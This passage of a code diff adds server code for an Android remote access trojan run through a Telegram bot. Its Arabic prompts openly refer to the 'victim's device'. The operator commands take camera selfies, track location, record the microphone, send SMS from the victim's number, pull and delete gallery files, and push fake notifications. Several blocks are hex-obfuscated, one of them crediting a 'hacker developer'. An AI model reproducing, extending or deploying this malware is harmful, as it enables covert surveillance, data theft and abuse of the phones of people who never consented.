+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'camera_selfie') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('camera_selfie');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'location') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('location');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'vibrate') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('vibrate');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'stop_audio') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('stop_audio');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'send_message') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
+            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
+            {reply_markup: {force_reply: true}})
+        currentUuid = uuid
+    }
+    if (commend == 'send_message_to_all') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n' +
+            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
+            {reply_markup: {force_reply: true}}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'file') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
+            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'delete_file') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد \n\n' +
+            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'microphone') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد \n\n' +
+            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'toast') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
+            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'show_notification') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
+            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'play_audio') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
+            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+});
+setInterval(function () {
+    appSocket.clients.forEach(function each(ws) {
+        ws.send('ping')
+    });
+    try {
+        axios.get(address).then(r => "")
+    } catch (e) {
+    }
+}, 5000)
+appServer.listen(process.env.PORT || 8999);
